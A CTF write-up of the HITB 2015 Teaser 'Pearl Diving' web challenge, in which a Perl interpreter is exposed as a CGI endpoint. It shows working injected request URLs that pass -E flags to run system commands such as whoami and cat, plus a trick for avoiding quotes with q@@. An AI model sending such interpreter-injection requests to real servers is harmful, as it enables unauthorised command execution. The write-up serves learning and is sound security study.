Title: web1000 - Pearl Diving
Author: dsc
Date: 2015-03-23 1:11
Tags: CTF


## Introduction

This is a write-up of the web1000 challenge (Pearl diving) of the HITB 2015 Teaser CTF. Here’s the original description of the challenge:

> Our aquaculture department has been farming sea organisms of various kinds for the past few years now. Recently we’ve started branching out and instead of maintaining just our own aquafarms, we’ve started stealing fish and plants from other people their farms as well! (How naughty of us, eh?) Recently during a deep sea TCP scan we uncovered what we believe is the endpoint for an aquafarm maintenance system ran by TEAM GUMFISH.

> TEAM GUMFISH is well known for their cutting edge technologies when it comes to accumulating vast amounts of oysters. An excessive (and lame) nikto scan pointed out one accessible URI endpoint which can be found here. However, so far we only seem to be getting “500 INTERNAL SERVER ERROR” out of it.

## Initial analysis

We are provided the following link:

    http://52.16.114.54/cgi-bin/perl

This reminds us of CVE-2012-1823 which involved a PHP interpreter being directly accessible through a webserver, an exploit found by the authors of this CTF.

Our suspicions were correct: visiting ‘http://52.16.114.54/cgi-bin/perl?-v’ outputs the Perl version which confirms that we were indeed dealing with a Perl interpreter that we can interact with.

Trying to get something more out of the interpreter other than -v or -h proved difficult. All tough we can probably start with a -e flag to execute commands, we could not use quotes as they were being URL encoded by the webserver. Exploiting this vector seemed tricky.

Thankfully, the ‘sleep’ function does not require any quotes and we can execute the following command to make the webserver sleep for 2 seconds.

    http://52.16.114.54/cgi-bin/perl?-Esleep%202

This however does not get us our flag :-)

## Quotes

Nobody in CED has any good experience writing Perl so we dove into the Perl documentation to find a correct approach for dealing with quotes.

First of all, we’re using -E instead of -e to enable ‘all features’, as some functions are not available with -e.

> -E commandline
> behaves just like -e, except that it implicitly enables all optional features (in the main compilation unit). See feature.

After some headache we finally found a solution for the quote problem.

> In Perl, you can use methods other than quotation marks to "quote" a string. This functionality makes using strings that contain quotation marks much easier sometimes, since those quotation marks no longer need to be escaped. There are three simple methods of doing this with the letter q.

Perl apparently has an option to use a q() notation for quotes. Other delimiters than parenthesis can be used in the q() example, like q@@ so we will use that, as URL encoding might do something to our beloved parenthesis.

## Exploitation

Using these 2 methods we made a test command.

    root@CED~$ perl -E 'print system q@whoami@'
    root
    root@CED~$

This works, so lets try it on the challenge.

    http://52.16.114.54/cgi-bin/perl?-Eprint,system%20q@whoami@

But not quite yet. The server still returns a 500 error.

Pretty quickly we came to the realisation that this was probably due to the fact that even though the Perl process gives output, the webserver wouldn’t have any of it as it violates the HTTP specification.

Looking at a random network capture of a webserver’s HTTP response we can observe that the content ends with a newline. Our content does not end with a newline. Once again we dive into the Perl documentation to see if there are other functions than print that append a newline to the output. Much like Python’s print() VS sys.stdout.write().

We stumble upon ‘say’.

> Perl 5.10 added 'say' which is a substitute for 'print' that automatically adds a newline to the output.

    http://52.16.114.54/cgi-bin/perl?-Esay,system%20q@whoami@

And we are finally presented with some server output. We quickly run a ‘ls’ and see a file called oyster. We cat this to get the flag.

    http://52.16.114.54/cgi-bin/perl?-Esay,system%20q@cat%20oyster@

Returns:

    #!/usr/bin/perl
     
    print "Content-Type: text/html\r\n\r\n";
     
    print "<pre>\n";
    print "                           ___---__---___\n";
    print "                         --              --\n";
    print "                        ~                  ~\n";
    print "                       ~~                  ~~\n";
    print "                      (__       ,--,       __)\n";
    print "                         ====- |#   | -====\n";
    print "   ~~---_____---~~~~--(~~       `--'         )~~-----____-----~\n";
    print "                      \\~~--___        ___--~~/\n";
    print "                       ~~--___---__---___--~~\n";
    print "                              --------\n";
    print "\n\n                       404 OYSTER NOT FOUND\n\n";
 
    # Okay, we lied: HITB{0736354855cdfeecbe3c659523f8cad2} :-)
